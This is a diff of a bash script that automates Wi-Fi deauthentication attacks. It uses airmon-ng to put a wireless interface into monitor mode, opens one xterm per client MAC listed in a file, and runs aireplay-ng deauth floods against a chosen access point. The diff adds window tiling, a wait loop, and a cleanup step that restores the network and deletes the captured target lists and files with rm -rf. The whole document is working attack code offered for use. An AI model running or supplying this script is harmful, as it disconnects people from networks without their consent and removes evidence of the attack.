@@ -11,6 +11,8 @@ White='\033[0;37m'        # White
 NC='\033[0m'
 x=1;
 
+clear
+mkdir ~/Desktop/MACS
 echo -e "${Green} Starting Monitor Mode on wlo1 ${NC}" 
 airmon-ng check kill && airmon-ng start wlo1
 
@@ -64,15 +66,39 @@ do
 		x=2
 	elif [ $ch -eq 1 ] 
 	then
+		clear
+		a=100
+		echo -e "${Red}BOOTING the devices${Yellow} NOW"
 		cat ~/Desktop/MACS/devices.txt | while read q
 		do
-			xterm +hold -e "aireplay-ng --deauth 20 -a $bssid -c $q wlo1mon" & 	
+			xterm +hold -geometry 91x31+"$a"+500 -e "aireplay-ng --deauth 20 -a $bssid -c $q wlo1mon" & 	
+			a=$(( $a + 100 ))
 		done
 		x=1
+
+		PROCESS="xterm"
+		while true
+		do
+			if pgrep -x "$PROCESS" >/dev/null
+			then 
+				echo -n -e "${NC}."
+				sleep 2
+				continue
+			else
+				echo ""
+				echo -e "${Green}Stopping Monitor mode on the interface...${NC}"
+				xterm +hold -e "airmon-ng stop wlo1mon && service network-manager restart"
+				sleep 2
+				echo -e "${Green}Deleting the captured files..."
+				sleep 2
+				rm -rf ~/Desktop/devices-*
+				rm -rf ~/Desktop/wifi-*
+				rm -rf ~/Desktop/MACS
+				echo -e "${Green}DONE."
+				break
+			fi
+		done
+
 	fi
 done
-
-rm -rf ~/Desktop/devices-*
-rm -rf ~/Desktop/wifi-*
-rm -rf ~/Desktop/MACS/*
 
